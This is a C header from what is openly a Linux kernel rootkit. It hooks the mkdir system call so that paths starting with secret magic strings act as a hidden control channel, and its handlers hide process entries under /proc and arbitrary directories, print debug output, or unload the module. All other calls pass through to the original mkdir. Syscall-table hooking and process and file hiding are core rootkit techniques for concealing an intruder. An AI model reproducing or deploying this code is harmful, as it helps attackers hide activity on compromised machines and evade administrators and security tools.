/*
	Use mkdir as a magic-string-based API for requesting things from our module.
	Any mkdir request that begins with a magic string will be redirected to the appropriate handler.
*/

#ifndef MKDIR_SHIM_H
#define MKDIR_SHIM_H

#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
#include "secrets.h"
#include "hiddenDirectories.h"

int hidePidApiHandler(char* pid) {
	char path[20];
	int i;
	path[19] = 0;
	strcpy(path, "/proc/");
	strncpy(path + 6, pid, sizeof(path)-7);
	printk("%s\n", path);
	hideDirectory(path);
	for (i = 0; i < hiddenDirectories->size; ++i) {
		printk(KERN_INFO "path: %s\n", (char*)hiddenDirectories->arr[i]);
	}
	return 0;
}

int hideDirectoryApiHandler(char* path) {
	int i;
	printk("%s\n", path);
	hideDirectory(path);
	for (i = 0; i < hiddenDirectories->size; ++i) {
		printk(KERN_INFO "path: %s\n", (char*)hiddenDirectories->arr[i]);
	}
	return 0;
}

int printApiHandler(char* arg) {
	//a debugging target.
	printk("%s\n", arg);
	return 0;
}

void cleanup_module(void);

int deactivateApiHandler(void) {
	//emergency deactivation of the kernel module
	cleanup_module();
	return 72;
}

int mkdirShim(char* path) {
	//if the path begins with a secret API string, pass it to the appropriate handler.
	if (strnstrn(path, strnlen(path, 20), secret_api_print, 20)) {
		return printApiHandler(path + 20);
	}
	else if (strnstrn(path, strnlen(path, 20), secret_api_deactivate, 20)) {
		return deactivateApiHandler();
	}
	else if (strnstrn(path, strnlen(path, 20), secret_api_hidepath, 20)) {
		return hideDirectoryApiHandler(path + 20);
	}
	else if (strnstrn(path, strnlen(path, 20), secret_api_hidepid, 20)) {
		return hidePidApiHandler(path + 20);
	}
	return ((SYS_mkdir_type)backup_sys_call_table[SYS_mkdir])(path);
}

#endif
